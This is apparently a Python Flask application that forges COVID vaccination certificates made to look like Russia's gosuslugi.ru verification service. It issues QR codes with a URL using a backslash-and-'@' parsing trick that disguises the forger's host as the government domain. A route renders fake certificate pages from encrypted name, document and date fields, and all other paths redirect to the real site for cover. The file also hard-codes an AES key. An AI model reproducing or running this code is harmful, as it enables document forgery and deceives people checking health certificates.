import sqlite3
import qrcode
from flask import Flask, render_template, redirect, request, abort, url_for, send_file
from io import BytesIO
from urllib.parse import urlparse, urlencode
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
import json

KEY = "gVsjLuWpFBdy6cqATAF5YcJLKZUvLqTe"

class AESCipher(object):

    def __init__(self, key): 
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.urlsafe_b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.urlsafe_b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

app = Flask(__name__)

def inject(data):
	base = urlparse(request.url_root)
	return f"{base.scheme}://{base.netloc}\\\\\\\\@www.gosuslugi.ru/vaccine/cert/verify/https://www.gosuslugi.ru/vaccine/cert/verify/d?s=" + AESCipher(KEY).encrypt(json.dumps(data)).decode("ascii")

def create_qr(name, doc, date):
	qr = qrcode.make(inject({"name": name, "doc": doc, "date": date}))
	io = BytesIO()
	qr.save(io, "JPEG", quality=70)
	io.seek(0)
	return io

@app.route("/g", methods = ['POST'])
def gen():
	return send_file(create_qr(request.json["name"], request.json["doc"], request.json["date"]), mimetype='image/jpeg')

@app.route("/<path:path>/d")
def get(path=""):
	data = json.loads(AESCipher(KEY).decrypt(request.args.get("s")))
	return render_template("page.html", name=data["name"], doc=data["doc"], date=data["date"])

@app.route("/", defaults={'path': ""})
@app.route("/<path:path>")
def other(path):
	return redirect("https://www.gosuslugi.ru/" + path, code=302)